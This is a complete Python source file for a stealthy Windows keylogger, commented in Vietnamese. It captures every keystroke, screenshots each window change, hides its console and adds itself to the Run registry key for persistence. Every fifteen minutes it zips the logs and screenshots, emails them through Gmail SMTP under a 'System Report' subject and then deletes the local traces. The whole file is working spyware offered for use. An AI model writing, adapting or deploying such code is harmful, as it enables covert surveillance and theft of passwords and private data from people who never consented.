import os
import time
import threading
from datetime import datetime
import keyboard
import pygetwindow as gw
from PIL import ImageGrab
import ctypes
from ctypes import wintypes
import win32gui
import win32con
import win32api
import smtplib
import zipfile
import shutil
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
from dotenv import load_dotenv
import winreg
import sys
import argparse

# Cấu hình
VISIBLE = False  # Ẩn console
BOOT_WAIT = True  # Chờ boot xong
AUTO_STARTUP = True  # Tự động startup
FORMAT = 0
MOUSE_IGNORE = True
EMAIL_INTERVAL = 15 * 60

# VK Constants
VK_CAPITAL = 0x14
VK_SHIFT = 0x10

# Mapping phím đặc biệt
KEY_MAPPING = {
    'backspace': '[BACKSPACE]',
    'enter': '\n',
    'space': '_',
    'tab': '[TAB]',
    'shift': '[SHIFT]',
    'ctrl': '[CTRL]',
    'alt': '[ALT]',
    'esc': '[ESCAPE]',
    'end': '[END]',
    'home': '[HOME]',
    'left': '[LEFT]',
    'right': '[RIGHT]',
    'up': '[UP]',
    'down': '[DOWN]',
    'page up': '[PG_UP]',
    'page down': '[PG_DOWN]',
    'caps lock': '[CAPSLOCK]',
    'delete': '[DELETE]',
    'insert': '[INSERT]',
}

class Keylogger:
    def __init__(self):
        # Setup AppData directory FIRST
        self.setup_appdata_directory()
        
        # Load environment variables
        self.load_env_config()
        
        # Initialize variables
        self.output_file = None
        self.current_hour = -1
        self.last_window = ""
        self.running = False
        self.email_timer = None
        
        # Create folders
        self.create_folders()
        self.validate_email_config()
        
        # Setup auto startup
        if AUTO_STARTUP:
            self.setup_auto_startup()
    
    def setup_appdata_directory(self):
        """Setup working directory trong AppData\Local"""
        try:
            # Lấy AppData\Local path
            appdata_local = os.environ.get('LOCALAPPDATA', os.path.expanduser('~\\AppData\\Local'))
            
            # Tạo thư mục base trong AppData\Local
            self.base_dir = os.path.join(appdata_local, "Reggolyek")
            os.makedirs(self.base_dir, exist_ok=True)
            
            # Setup paths cho captured folder
            self.captured_folder = os.path.join(self.base_dir, "captured")
            self.logs_folder = os.path.join(self.captured_folder, "logs")
            self.screenshots_folder = os.path.join(self.captured_folder, "screenshots")
            
            print(f"Base directory: {self.base_dir}")
            print(f"Captured folder: {self.captured_folder}")
            
        except Exception as e:
            print(f"Error setting up AppData directory: {e}")
            # Fallback to temp directory
            import tempfile
            self.base_dir = os.path.join(tempfile.gettempdir(), "Reggolyek")
            os.makedirs(self.base_dir, exist_ok=True)
            self.captured_folder = os.path.join(self.base_dir, "captured")
            self.logs_folder = os.path.join(self.captured_folder, "logs")
            self.screenshots_folder = os.path.join(self.captured_folder, "screenshots")
    
    def load_env_config(self):
        """Load cấu hình email từ .env với fallback"""
        global GMAIL_EMAIL, GMAIL_PASSWORD, RECIPIENT_EMAIL
        
        try:
            # Lấy thư mục Downloads
            downloads_folder = os.path.join(os.path.expanduser('~'), 'Downloads')
            
            # Thử load từ các locations khác nhau (Downloads ưu tiên đầu)
            env_locations = [
                os.path.join(self.base_dir, '.env'),  # AppData folder
                os.path.join(downloads_folder, 'Reggolyek', 'keylogger', '.env'),  # Downloads/Reggolyek/keylogger/.env
                os.path.join(downloads_folder, 'Reggolyek', '.env'),  # Downloads/Reggolyek/.env  
                os.path.join(downloads_folder, '.env'),  # Downloads/.env
                os.path.join(os.path.dirname(sys.executable if getattr(sys, 'frozen', False) else __file__), '.env'),  # Same as exe
                '.env'  # Current directory
            ]
            
            loaded = False
            for env_path in env_locations:
                if os.path.exists(env_path):
                    load_dotenv(env_path)
                    print(f"Loaded .env from: {env_path}")
                    loaded = True
                    break
            
            if not loaded:
                print("No .env file found, using environment variables")
                load_dotenv()  # Load from environment
            
            # Load config
            GMAIL_EMAIL = os.getenv('GMAIL_EMAIL')
            GMAIL_PASSWORD = os.getenv('GMAIL_PASSWORD')
            RECIPIENT_EMAIL = os.getenv('RECIPIENT_EMAIL')
            
            # Copy .env file to AppData nếu tìm thấy ở chỗ khác
            if loaded and not os.path.exists(os.path.join(self.base_dir, '.env')):
                for env_path in env_locations[1:]:  # Skip AppData location
                    if os.path.exists(env_path):
                        try:
                            shutil.copy2(env_path, os.path.join(self.base_dir, '.env'))
                            print(f"Copied .env to AppData: {self.base_dir}")
                            break
                        except:
                            pass
            
        except Exception as e:
            print(f"Error loading env config: {e}")
            # Set defaults to None
            GMAIL_EMAIL = GMAIL_PASSWORD = RECIPIENT_EMAIL = None
    
    def create_folders(self):
        """Tạo các folder cần thiết trong AppData"""
        try:
            print(f"Creating folders in: {self.captured_folder}")
            os.makedirs(self.captured_folder, exist_ok=True)
            os.makedirs(self.logs_folder, exist_ok=True)
            os.makedirs(self.screenshots_folder, exist_ok=True)
            
            # Test write permission
            test_file = os.path.join(self.captured_folder, "test_write.tmp")
            with open(test_file, 'w') as f:
                f.write("test")
            os.remove(test_file)
            
            print(f"✓ Created folders successfully at: {self.captured_folder}")
        except Exception as e:
            print(f"Error creating folders: {e}")
    
    def validate_email_config(self):
        """Kiểm tra cấu hình email"""
        if not all([GMAIL_EMAIL, GMAIL_PASSWORD, RECIPIENT_EMAIL]):
            print("Warning: Email configuration incomplete. Email sending will be disabled.")
            print("Please check your .env file.")
            return False
        print(f"Email configuration validated. Will send to: {RECIPIENT_EMAIL}")
        return True
    
    def create_zip_archive(self):
        """Tạo file zip chứa toàn bộ folder captured"""
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            zip_filename = os.path.join(self.base_dir, f"captured_data_{timestamp}.zip")
            
            with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(self.captured_folder):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, self.base_dir)
                        zipf.write(file_path, arcname)
                        print(f"Added to zip: {arcname}")
            
            print(f"Zip archive created: {zip_filename}")
            return zip_filename
        except Exception as e:
            print(f"Error creating zip archive: {e}")
            return None
    
    def send_email_with_attachment(self, zip_filepath):
        """Gửi email với file đính kèm"""
        try:
            print(f"Sending email to {RECIPIENT_EMAIL}...")
            
            msg = MIMEMultipart()
            msg['From'] = GMAIL_EMAIL
            msg['To'] = RECIPIENT_EMAIL
            msg['Subject'] = f"System Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            
            body = f"""
System Report

Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Data Location: {self.base_dir}

This email contains captured system data.

Files included:
- Log files from keyboard activity
- Screenshots from window changes

This is an automated message sent every {EMAIL_INTERVAL//60} minutes.
            """
            
            msg.attach(MIMEText(body, 'plain'))
            
            # Đính kèm file zip
            if zip_filepath and os.path.exists(zip_filepath):
                with open(zip_filepath, "rb") as attachment:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(attachment.read())
                
                encoders.encode_base64(part)
                part.add_header(
                    'Content-Disposition',
                    f'attachment; filename= {os.path.basename(zip_filepath)}'
                )
                msg.attach(part)
                print(f"Attached file: {zip_filepath}")
            
            # Gửi email
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(GMAIL_EMAIL, GMAIL_PASSWORD)
            text = msg.as_string()
            server.sendmail(GMAIL_EMAIL, RECIPIENT_EMAIL, text)
            server.quit()
            
            print(f"Email sent successfully to {RECIPIENT_EMAIL}")
            return True
            
        except Exception as e:
            print(f"Error sending email: {e}")
            return False
    
    def delete_captured_folder(self):
        """Xóa toàn bộ folder captured"""
        try:
            if self.output_file:
                try:
                    self.output_file.close()
                    self.output_file = None
                except:
                    pass
            
            if os.path.exists(self.captured_folder):
                shutil.rmtree(self.captured_folder)
                print(f"Deleted folder: {self.captured_folder}")
            
            self.create_folders()
            self.current_hour = -1
            
        except Exception as e:
            print(f"Error deleting captured folder: {e}")
    
    def send_and_cleanup(self):
        """Zip, gửi email và cleanup"""
        try:
            print("\n" + "="*50)
            print("Starting email send and cleanup process...")
            
            has_logs = os.path.exists(self.logs_folder) and os.listdir(self.logs_folder)
            has_screenshots = os.path.exists(self.screenshots_folder) and os.listdir(self.screenshots_folder)
            
            if not has_logs and not has_screenshots:
                print("No data to send")
                print("="*50 + "\n")
                return
            
            zip_filepath = self.create_zip_archive()
            if not zip_filepath:
                print("Failed to create zip archive")
                print("="*50 + "\n")
                return
            
            email_sent = self.send_email_with_attachment(zip_filepath)
            
            if email_sent:
                print("Email sent successfully!")
                try:
                    os.remove(zip_filepath)
                    print(f"Deleted zip file: {zip_filepath}")
                except:
                    pass
                
                self.delete_captured_folder()
                print("Cleanup completed successfully!")
            else:
                print("Failed to send email, keeping files")
                try:
                    os.remove(zip_filepath)
                except:
                    pass
            
            print("="*50 + "\n")
                
        except Exception as e:
            print(f"Error in send_and_cleanup: {e}")
    
    def schedule_email_sending(self):
        """Lên lịch gửi email định kỳ"""
        if self.validate_email_config():
            self.send_and_cleanup()
        
        if self.running:
            print(f"Next email scheduled in {EMAIL_INTERVAL//60} minutes...")
            self.email_timer = threading.Timer(EMAIL_INTERVAL, self.schedule_email_sending)
            self.email_timer.start()
        
    def setup_stealth(self):
        """Ẩn console window"""
        if not VISIBLE:
            console_window = ctypes.windll.kernel32.GetConsoleWindow()
            if console_window:
                ctypes.windll.user32.ShowWindow(console_window, 0)
    
    def is_system_booting(self):
        """Kiểm tra hệ thống có đang boot không"""
        try:
            uptime = ctypes.windll.kernel32.GetTickCount64() / 1000
            return uptime < 120
        except:
            return False
    
    def wait_for_boot(self):
        """Chờ hệ thống boot xong"""
        if BOOT_WAIT:
            while self.is_system_booting():
                print("System is still booting up. Waiting 10 seconds...")
                time.sleep(10)
    
    def get_active_window_title(self):
        """Lấy title của cửa sổ đang active"""
        try:
            window = gw.getActiveWindow()
            if window:
                return window.title
        except:
            pass
        return ""
    
    def take_screenshot(self):
        """Chụp màn hình"""
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            filename = f"screenshot_{timestamp}.png"
            filepath = os.path.join(self.screenshots_folder, filename)
            
            screenshot = ImageGrab.grab()
            screenshot.save(filepath)
            print(f"Screenshot saved: {filepath}")
        except Exception as e:
            print(f"Error taking screenshot: {e}")
    
    def process_key(self, key_event):
        """Xử lý phím được bấm"""
        try:
            now = datetime.now()
            
            current_window = self.get_active_window_title()
            if current_window != self.last_window and current_window:
                self.take_screenshot()
                self.last_window = current_window
                timestamp_str = now.strftime("%Y-%m-%dT%H:%M:%S")
                self.write_to_log(f"\n\n[Window: {current_window} - at {timestamp_str}] ")
            
            key_str = self.format_key(key_event)
            if key_str:
                self.write_to_log(key_str)
                
        except Exception as e:
            print(f"Error processing key: {e}")
    
    def format_key(self, key_event):
        """Format phím thành string"""
        try:
            key_name = key_event.name.lower()
            
            if FORMAT == 10:
                if len(key_name) == 1:
                    return f'[{ord(key_name)}]'
                else:
                    return f'[{key_name.upper()}]'
            elif FORMAT == 16:
                if len(key_name) == 1:
                    return f'[{hex(ord(key_name))}]'
                else:
                    return f'[{key_name.upper()}]'
            else:
                if key_name in KEY_MAPPING:
                    return KEY_MAPPING[key_name]
                elif len(key_name) == 1:
                    try:
                        caps_on = win32api.GetKeyState(VK_CAPITAL) & 1
                        shift_pressed = (win32api.GetKeyState(VK_SHIFT) & 0x8000) != 0
                        
                        if caps_on ^ shift_pressed:
                            return key_name.upper()
                        else:
                            return key_name.lower()
                    except:
                        return key_name.lower()
                else:
                    return f'[{key_name.upper()}]'
                    
        except Exception as e:
            return f'[ERROR: {e}]'
    
    def write_to_log(self, text):
        """Ghi text vào file log"""
        try:
            now = datetime.now()
            
            if self.current_hour != now.hour:
                if self.output_file:
                    self.output_file.close()
                
                self.current_hour = now.hour
                filename = now.strftime("%Y-%m-%d__%H-%M-%S.log")
                filepath = os.path.join(self.logs_folder, filename)
                self.output_file = open(filepath, 'a', encoding='utf-8')
                print(f"Logging to: {filepath}")
            
            if self.output_file:
                self.output_file.write(text)
                self.output_file.flush()
            
            if VISIBLE:
                print(text, end='')
                
        except Exception as e:
            print(f"Error writing to log: {e}")
    
    def on_key_event(self, key_event):
        """Callback khi có phím được bấm"""
        if key_event.event_type == keyboard.KEY_DOWN:
            self.process_key(key_event)
    
    def setup_auto_startup(self):
        """Thêm vào Windows startup"""
        try:
            if getattr(sys, 'frozen', False):
                exe_path = sys.executable
            else:
                exe_path = os.path.abspath(__file__)
            
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            
            # Đổi tên stealth hơn
            winreg.SetValueEx(key, "Reggolyek", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            
            print("✓ Added to Windows startup")
            
        except Exception as e:
            print(f"Failed to add to startup: {e}")
    
    def remove_from_startup(self):
        """Xóa khỏi startup"""
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.DeleteValue(key, "Reggolyek")
            winreg.CloseKey(key)
            print("✓ Removed from startup")
        except:
            pass

    def start(self):
        """Bắt đầu keylogger"""
        print("Starting system monitor...")
        print(f"Data will be stored in: {self.base_dir}")
        
        self.setup_stealth()
        self.wait_for_boot()
        
        self.running = True
        keyboard.hook(self.on_key_event)
        
        if self.validate_email_config():
            print(f"Email sending scheduled every {EMAIL_INTERVAL//60} minutes")
            self.email_timer = threading.Timer(EMAIL_INTERVAL, self.schedule_email_sending)
            self.email_timer.start()
        
        print("System monitor started.")
        
        try:
            while self.running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            print("\nStopping system monitor...")
            self.stop()
    
    def stop(self):
        """Dừng keylogger"""
        self.running = False
        
        if self.email_timer:
            self.email_timer.cancel()
        
        if self.validate_email_config():
            print("Sending final email before shutdown...")
            self.send_and_cleanup()
        
        keyboard.unhook_all()
        if self.output_file:
            self.output_file.close()
        
        print("System monitor stopped.")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--remove-startup', action='store_true', help='Remove from startup')
    args = parser.parse_args()
    
    keylogger = Keylogger()
    
    if args.remove_startup:
        keylogger.remove_from_startup()
        return
    
    keylogger.start()

if __name__ == "__main__":
    main()